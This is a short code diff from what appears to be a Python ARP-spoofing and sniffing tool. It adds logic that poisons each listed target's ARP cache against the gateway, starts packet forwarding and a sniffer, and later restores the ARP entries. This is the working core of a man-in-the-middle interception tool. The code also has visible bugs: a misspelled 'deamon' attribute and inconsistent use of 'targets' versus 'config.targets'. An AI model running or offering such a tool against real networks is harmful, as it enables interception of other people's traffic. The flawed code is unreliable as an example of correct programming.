@@ -33,6 +33,22 @@ def show_targets(args):
         print(target)
 
 def arp_spoof(args):
-    forwading_thread = threading.Thread(target=enable_forwarding, args=(gateway_mac, my_mac))
-    forwading_thread.deamon = True
-    forwading_thread.start()
+    if config.spoofing:
+        print("Already spoofing!")
+        return
+    else:
+        config.forwading_thread = threading.Thread(target=enable_forwarding, args=(config.gateway_mac, config.my_mac))
+        config.forwading_thread.deamon = True
+        config.forwading_thread.start()
+        for target in targets:
+            print("Spoofing " + target["ip"] + "...")
+            spoof(target["ip"], config.gateway_ip, target["mac"], config.gateway_mac, config.my_mac)
+        print("Spoofing done.")
+        config.spoofing = True
+
+def stop_arp_spoofing():
+    for target in config.targets:
+        restore_arp(target["mac"], config.gateway_mac, target["ip"], config.gateway_ip)
+    print("Stopping ARP spoofing.")
+    config.spoofing = False
+    config.sniffer.stop()
